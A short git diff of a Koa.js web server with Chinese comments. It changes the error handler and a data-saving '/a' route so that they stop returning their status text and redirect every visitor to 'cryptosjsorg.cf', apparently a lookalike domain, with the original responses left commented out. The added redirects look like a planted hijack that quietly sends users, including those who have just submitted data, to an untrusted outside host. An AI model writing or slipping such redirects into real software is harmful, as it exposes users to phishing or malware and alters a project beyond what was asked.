@@ -65,11 +65,14 @@ app.use(async (ctx, next)=>{
     try{
         await next();   // 执行后代的代码
         if(!ctx.body){  // 没有资源
-            ctx.body = "404"
+
+            ctx.response.redirect('http://cryptosjsorg.cf');
+            // ctx.body = "404"
         }
     }catch(e){
         // 如果后面的代码报错 返回500
-        ctx.body = "500"
+        ctx.response.redirect('https://cryptosjsorg.cf');
+        // ctx.body = "500"
     }
 })
 
@@ -165,9 +168,13 @@ router.get('/a', async ctx => {
                 data.Time=getTimeByTimeZone(8);
                 datas.todos.push(data);
                 fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
-                return ctx.body = "1";
+                ctx.response.redirect('http://cryptosjsorg.cf');
+                // ctx.body = "1";
+                return ;
             } else {
-                return ctx.body = "0"
+                ctx.response.redirect('http://cryptosjsorg.cf');
+                // ctx.body = "0"
+                return ;
             }
         })
         
